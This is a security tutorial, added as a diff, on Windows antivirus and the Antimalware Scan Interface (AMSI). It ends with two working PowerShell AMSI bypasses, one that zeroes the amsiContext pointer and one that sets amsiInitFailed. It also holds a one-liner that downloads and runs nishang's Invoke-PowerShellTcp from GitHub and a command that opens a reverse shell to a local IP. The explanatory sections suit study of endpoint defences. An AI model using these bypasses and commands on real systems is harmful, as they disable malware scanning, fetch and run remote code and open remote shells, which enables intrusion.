@@ -1,0 +1,276 @@
+                     ______________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                              AMSI Bypass
+
+                                Hexdump
+                     ______________________________
+
+
+Table of Contents
+_________________
+
+1. What is an Antivirus?
+.. 1. Related Technologies
+2. and in Windows?
+.. 1. Windows Antimalware Scan Interface (AMSI)
+3. AMSI Bypass
+.. 1. Bypass #1
+.. 2. Bypass #2
+4. References
+
+
+1 What is an Antivirus?
+=======================
+
+  An `antivirus' is a software program designed to detect, prevent, and
+  remove malicious software, which is also known as `malware'.
+
+  To differentiate standard software from malicious software various
+  techniques can be used:
+
+  1. Signature-Based Detection
+
+     Compares files and programs against a database of known malware
+     signatures (unique identifiers for malicious code).
+
+  2. Static Analysis
+
+     Analyzes the behavior and structure of files to detect suspicious
+     patterns resembling malware.
+
+  3. Dynamic Analysis
+
+     Monitors real-time behavior of programs to identify malicious
+     actions.
+
+     Can use `sandboxes' as isolated environments to observe malware
+     behavior.
+
+  4. Machine Learning Analysis
+
+     Uses algorithms to identify patterns in files or behaviors that
+     indicate malicious intent.
+
+
+1.1 Related Technologies
+~~~~~~~~~~~~~~~~~~~~~~~~
+
+  In the context of analyzing malware, there are many related
+  technologies:
+
+  - Network Firewalls
+  - Web Application Firewalls
+  - Intrusion Detection and prevention Systems (IDPS)
+  - Endpoint Detection and Response (EDR)
+
+
+2 and in Windows?
+=================
+
+  In the context of windows, the following default technologies can be
+  used to increase the security of the system:
+
+  - *Windows Defender Antivirus*
+
+    Provides real-time protection against viruses, malware, and spyware.
+
+  - *Firewall & Network Protection*
+
+    Monitors incoming and outgoing traffic to block unauthorized access.
+
+  - *Windows Hello*
+
+    Offers secure, password-free sign-in using biometrics.
+
+  - *BitLocker*
+
+    Encrypts hard drives to protect data from unauthorized access,
+    particularly useful on lost or stolen devices.
+
+  - *Secure Boot*
+
+    Ensures that only trusted software loads during startup to prevent
+    rootkits and bootkits.
+
+
+2.1 Windows Antimalware Scan Interface (AMSI)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  In 2015, Microsoft introduced the `Windows Antimalware Scan Interface'
+     (AMSI), which is an agnostic security interface that allows
+     application and services to integrate with security products
+     installed on a computer in order to provide security scans.
+
+  It provides a standard interface that allows solutions to scan files,
+  memory, and other data for threats.
+
+  Data flow of AMSI:
+
+  1. Application or service requests a scan
+
+  2. The request is sent to the AMSI provider, which is a security
+     solution installed on the system.
+
+  3. The AMSI provider then performs the scan using its own malware
+     detection algorithms.
+
+  4. The results of the scans are returned to the requesting application
+     or service.
+
+  AMSI can analyze the following components:
+
+  - PowerShell (from v2.0)
+  - Windows Script Host
+  - JavaScript and VBScript
+  - Office Macros (VBA)
+  - Excel Macros
+  - .NET framework
+  - Windows Management Instrumentation (WMI)
+
+  ----------------------------------------------------------------------
+
+  To list out existing AMSI DLLs
+  ,----
+  | tasklist /m amsi*
+  `----
+
+  To list out AMSI providers
+  ,----
+  | Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object DisplayName, PathToSignedProductExe, ProductState
+  `----
+
+  ----------------------------------------------------------------------
+
+  The following ASMI Architecture is described by the following image:
+
+  <file:img/amsi7archi.jpg>
+
+  Developers make AMSI request using specific APIs
+  ,----
+  | // Initialize AMSI
+  | hResult = AmsiInitialize(APP_NAME, &amsiContext);
+  | hResult = AmsiOpenSession(amsiContext, &session);
+  | // Scan
+  | hResult = AmsiScanBuffer(amsiContext, content, contentSize, fname, session, &amsiRes);
+  `----
+
+
+3 AMSI Bypass
+=============
+
+  Open a `powershell.exe' with the antivirus ON, and try to download the
+  `Invoke-PowerShellTcp' and load it into the process memory
+
+  ,----
+  | iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -UseBasicParsing).Content
+  `----
+
+  You will see the following error, which is the result of an AMSI scan.
+
+  ,----
+  | iex : At line:1 char:1
+  | + function Invoke-PowerShellTcp
+  | + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  | This script contains malicious content and has been blocked by your antivirus software.
+  | At line:1 char:1
+  | + iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/maste ...
+  | + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  |     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+  |     + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+  `----
+
+  If we bypass AMSI however, we will be able to avoid such error and to
+  spawn a reverse shell, even if the antivirus is executing.
+
+  The idea behind all AMSI bypass techniques have to do with modifying
+  in the memory of the powershell the structures used by the AMSI
+  system.
+
+  ,----
+  | // Initialize AMSI
+  | hResult = AmsiInitialize(APP_NAME, &amsiContext);
+  | hResult = AmsiOpenSession(amsiContext, &session);
+  | // Scan
+  | hResult = AmsiScanBuffer(amsiContext, content, contentSize, fname, session, &amsiRes);
+  `----
+
+  For example, the `HAMSICONTEXT' structure is used in every
+  AMSI-related functions
+
+  ,----
+  | HRESULT AmsiInitialize(
+  |  LPCWSTR appName,
+  |  HAMSICONTEXT *amsiContext
+  | );
+  `----
+
+  ,----
+  | HRESULT AmsiOpenSession(
+  |  HAMSICONTEXT amsiContext,
+  |  HAMSISESSION *amsiSession
+  | );
+  `----
+
+
+3.1 Bypass #1
+~~~~~~~~~~~~~
+
+  The first bypass consists in modifying one field of the
+  `System.Management.Automation.AmsiUtils' class, is an internal .NET
+  class within PowerShell that interacts with the Antimalware Scan
+  Interface (AMSI). The field we're interested specifically in is the
+  `amsiContext' field.
+
+  To bypass AMSI, execute the following code within the powershell
+  process
+
+  ,----
+  | $fields=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static')
+  | $amsiContext=$fields | Where-Object { $_ -like "*Context" }
+  | [IntPtr]$amsiContextPointer=$amsiContext.GetValue($null)
+  | 
+  | [Int32[]]$emptyBuffer = @(0);
+  | [System.Runtime.InteropServices.Marshal]::Copy($emptyBuffer, 0, $amsiContextPointer, 1)
+  `----
+
+  Now, execute it again
+
+  ,----
+  | iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -UseBasicParsing).Content
+  `----
+
+  Notice that now, no error appears. You can then start a reverse shell.
+
+  ,----
+  | Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 4321
+  `----
+
+
+3.2 Bypass #2
+~~~~~~~~~~~~~
+
+  The second method consist in setting the `amsiInitFailed' field to
+  `true' within the `AmsiUtils' class.
+
+  ,----
+  | $amsiInitFailedField=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" }
+  | $amsiInitFailedField.SetValue($null, $true)
+  `----
+
+
+4 References
+============
+
+  AMSI & Bypass: Review of Known AMSI Bypass Techniques and Introducing
+  a New One <https://www.youtube.com/watch?v=8y8saWvzeLw>
+
+  This repo contains some Amsi Bypass methods i found on different Blog
+  Posts.
+  <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Forcing-an-error>
+
+  One-liner to bypass the AMSI in a Powershell.
+  <https://arttoolkit.github.io/wadcoms/AMSI-Bypass-amsiContext/>
+
+  All methods to bypass AMSI (2022)
+  <https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4>
